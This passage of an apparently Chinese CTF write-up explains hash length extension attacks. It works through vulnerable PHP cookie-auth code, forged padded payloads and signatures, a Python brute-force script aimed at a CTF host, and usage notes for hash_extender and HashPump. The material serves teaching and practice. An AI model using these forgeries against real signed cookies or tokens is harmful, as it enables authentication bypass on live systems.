class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">samplehash='</span>571580b26c65f306376d4f64e53cb5c7<span class="string">'</span></span><br><span class="line"><span class="string">s1='</span>0x<span class="string">'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]</span></span><br><span class="line"><span class="string">s2='</span>0x<span class="string">'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]</span></span><br><span class="line"><span class="string">s3='</span>0x<span class="string">'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]</span></span><br><span class="line"><span class="string">s4='</span>0x<span class="string">'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]</span></span><br><span class="line"><span class="string">print s1,'</span>\n<span class="string">',s2,'</span>\n<span class="string">',s3,'</span>\n<span class="string">',s4</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line">import my_md5</span><br><span class="line"><span class="comment">#reference:</span></span><br><span class="line"><span class="comment">#   http://www.freebuf.com/articles/web/69264.html</span></span><br><span class="line"><span class="comment">#problem link:</span></span><br><span class="line"><span class="comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span></span><br><span class="line"></span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s1)</span><br></pre></td></tr></table></figure></p><p>exp：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">"a"</span>*15</span><br><span class="line">secret_admin = secret+<span class="string">'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'</span></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure></p><p>burp抓包改包：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=admin+\x80\x00……admin</span><br><span class="line">\x80\x00要在hex里面修改</span><br></pre></td></tr></table></figure></p><p><img src="5.png" alt></p><p><img src="6.png" alt></p><h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$SECRET</span>=<span class="string">"234098761"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="literal">false</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="literal">true</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$auth</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>]);  //先给<span class="variable">$auth</span>赋一个真值</span><br><span class="line">        <span class="variable">$hsh</span>=<span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$hsh</span> !== <span class="built_in">hash</span>(<span class="string">"sha256"</span>,<span class="variable">$SECRET</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>])))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"hsh is error! &lt;br /&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$s</span>=serialize(<span class="variable">$auth</span>);</span><br><span class="line">        setcookie(<span class="string">"auth"</span>,<span class="variable">$s</span>);</span><br><span class="line">        setcookie(<span class="string">"hsh"</span>,<span class="built_in">hash</span>(<span class="string">"sha256"</span>,<span class="variable">$SECRET</span>.strrev(<span class="variable">$s</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"succusel &lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"fails &lt;br /&gt;"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>strrev()  反转字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ./hash_extender -f sha256 -l 9 -d <span class="string">';0:b'</span> -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a <span class="string">';1:b'</span> --out-data-format=html  </span><br><span class="line"></span><br><span class="line">Type: sha256  </span><br><span class="line">Secret length: 9  </span><br><span class="line">New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560  </span><br><span class="line">New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab</span><br></pre></td></tr></table></figure></p><p>从上面算得的值hash值是 sha256(key || padding || append) append的值是true的值。将cookie中的hsh换成上面的生成的新hash,再把上面的string逆序下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b%3a1%3bh%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b</span><br></pre></td></tr></table></figure></p><p>用上面的字符串修改auth的cookie值，再访问此网页就会认证成功了：</p><p><img src="7.png" alt></p><h2 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h2><p>secret长度不知道暴力攻击</p><p>题目：flag在管理员手里</p><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p>用御剑 1.5 扫描 找到 index.php~  打开都是乱码<br>拷贝至 linux 虚拟机名字改成 .index.php.swp<br>vim -r index.php  保存即可</p><p>得到的代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$role</span> = <span class="string">"guest"</span>;</span><br><span class="line"><span class="variable">$salt</span> = </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</span><br><span class="line"><span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</span><br><span class="line">setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</span><br><span class="line">setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>很明显secret长度不知道，只能通过爆破</p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from urlparse import urlparse</span><br><span class="line">from httplib import HTTPConnection</span><br><span class="line">from urllib import urlencode</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def gao(x, y):</span><br><span class="line">    <span class="comment">#print x</span></span><br><span class="line">    <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">";hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">' Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="built_in">return</span> body</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(1000):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[0][:32]</span><br><span class="line">    attack_padding = calc_res[0][32:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span> ret</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p><p>将上述代码保存至 hash_extender.py<br>到 hash_extender 的目录下运行 python hash_extender.py 得到如下：</p><p><img src="3_3.png" alt></p><h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><h2 id="HashExtender和hashdump使用"><a href="#HashExtender和hashdump使用" class="headerlink" title="HashExtender和hashdump使用"></a>HashExtender和hashdump使用</h2><h3 id="HashExtender"><a href="#HashExtender" class="headerlink" title="HashExtender"></a>HashExtender</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line">$ pip install HashExtender</span><br><span class="line"></span><br><span class="line">Usage</span><br><span class="line">&gt;&gt;&gt; import hashext</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span> hashext.md5(data = <span class="string">'123'</span>, sign = <span class="string">'109889f941630d269546335f728f3558'</span>, length = 5, append = <span class="string">'test'</span>)</span><br><span class="line">(<span class="string">'123\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00test'</span>, <span class="string">'e5f78513e536615a6f5164ccff96d4d9'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ● data - your original signed message</span><br><span class="line">  ● sign - message signature, MD5(secret + msg)</span><br><span class="line">  ● length - probable length of secret string</span><br><span class="line">  ● append - data to append to new string</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line"></span><br><span class="line">  1. git <span class="built_in">clone</span> https://github.com/iagox86/hash_extender  </span><br><span class="line">  2. <span class="built_in">cd</span> hash_extender  </span><br><span class="line">  3. make  </span><br><span class="line"></span><br><span class="line">useage</span><br><span class="line"></span><br><span class="line"> ./hash_extender &lt;--data=|--file=&gt; --signature= --format= [options]</span><br><span class="line"></span><br><span class="line">INPUT OPTIONS</span><br><span class="line">-d --data=</span><br><span class="line">      The original string that we<span class="string">'re going to extend.</span></span><br><span class="line"><span class="string">--data-format=</span></span><br><span class="line"><span class="string">      The format the string is being passed in as. Default: raw.</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">--file=</span></span><br><span class="line"><span class="string">      As an alternative to specifying a string, this reads the original string</span></span><br><span class="line"><span class="string">      as a file.</span></span><br><span class="line"><span class="string">-s --signature=</span></span><br><span class="line"><span class="string">      The original signature.</span></span><br><span class="line"><span class="string">--signature-format=</span></span><br><span class="line"><span class="string">      The format the signature is being passed in as. Default: hex.</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">-a --append=</span></span><br><span class="line"><span class="string">      The data to append to the string. Default: raw.</span></span><br><span class="line"><span class="string">--append-format=</span></span><br><span class="line"><span class="string">      Valid formats: raw, hex, html, cstr</span></span><br><span class="line"><span class="string">-f --format= [REQUIRED]</span></span><br><span class="line"><span class="string">      The hash_type of the signature. This can be given multiple times if you</span></span><br><span class="line"><span class="string">      want to try multiple signatures. '</span>all<span class="string">' will base the chosen types off</span></span><br><span class="line"><span class="string">      the size of the signature and use the hash(es) that make sense.</span></span><br><span class="line"><span class="string">      Valid types: md4, md5, ripemd160, sha, sha1, sha256, sha512, whirlpool</span></span><br><span class="line"><span class="string">-l --secret=</span></span><br><span class="line"><span class="string">      The length of the secret, if known. Default: 8.</span></span><br><span class="line"><span class="string">--secret-min=</span></span><br><span class="line"><span class="string">--secret-max=</span></span><br><span class="line"><span class="string">      Try different secret lengths (both options are required)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OUTPUT OPTIONS</span></span><br><span class="line"><span class="string">--table</span></span><br><span class="line"><span class="string">      Output the string in a table format.</span></span><br><span class="line"><span class="string">--out-data-format=</span></span><br><span class="line"><span class="string">      Output data format.</span></span><br><span class="line"><span class="string">      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy</span></span><br><span class="line"><span class="string">--out-signature-format=</span></span><br><span class="line"><span class="string">      Output signature format.</span></span><br><span class="line"><span class="string">      Valid formats: none, raw, hex, html, html-pure, cstr, cstr-pure, fancy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OTHER OPTIONS</span></span><br><span class="line"><span class="string">-h --help </span></span><br><span class="line"><span class="string">      Display the usage (this).</span></span><br><span class="line"><span class="string">--test</span></span><br><span class="line"><span class="string">      Run the test suite.</span></span><br><span class="line"><span class="string">-q --quiet</span></span><br><span class="line"><span class="string">      Only output what'</span>s absolutely necessary (the output string and the</span><br><span class="line">      signature)</span><br></pre></td></tr></table></figure></p><p>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ./hash_extender -f sha256 -l 9 -d <span class="string">';0:b'</span> -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a <span class="string">';1:b'</span> --out-data-format=html  </span><br><span class="line"></span><br><span class="line">Type: sha256  </span><br><span class="line">Secret length: 9  </span><br><span class="line">New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560  </span><br><span class="line">New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab</span><br></pre></td></tr></table></figure></p><p>-f 代表加密方式</p><p>-l key的长度</p><p>-s 原始的hash值</p><p>-a 添加的值</p><p>–out-data-format 输出的格式</p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Installing</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>至于想在python里实现hashpump，可以使用hashpumpy这个插件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install hashpumpy</span><br></pre></td></tr></table></figure></p><p>Usage<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: pcat</span><br></pre></td></tr></table></figure></p><p>或者直接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a pcat</span><br></pre></td></tr></table></figure></p><p>就会得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3e67e8f0c05e1ad68020df30bbc505f5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00pcat</span><br></pre></td></tr></table></figure></p><p>第一个是新的签名，把它设置到cookies的getmein里。<br>第二个先把\x替换为%后，post提交<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00pcat</span><br></pre></td></tr></table></figure></p><h2 id="os-命令介绍"><a href="#os-命令介绍" class="headerlink" title="os 命令介绍"></a>os 命令介绍</h2><h3 id="os-popen"><a href="#os-popen" 